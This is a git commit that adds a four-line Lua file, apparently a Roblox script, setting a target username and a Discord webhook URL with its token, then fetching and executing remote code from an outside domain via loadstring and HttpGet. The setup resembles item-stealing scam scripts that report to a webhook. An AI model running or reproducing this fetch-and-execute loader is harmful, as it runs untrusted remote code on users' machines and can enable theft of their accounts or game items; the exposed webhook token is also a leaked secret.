074308b55fa1ddbfa4ee0e3007c7547c4e918787
Xtnq <choineruh@gmail.com>
2024-08-07 16:39:46 +0800

    Add files via upload

---
+++ lual.lua
@@ -0,0 +1,4 @@
+Username = "superjessica3024"
+Webhook = "https://discordapp.com/api/webhooks/1270661366671343646/gZQGa24J93DxKOIIyPPbaUa-eFPu0Ur4hYzDtKLyAJ6CNGcVENhdvip-rla4RbQBBET1"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
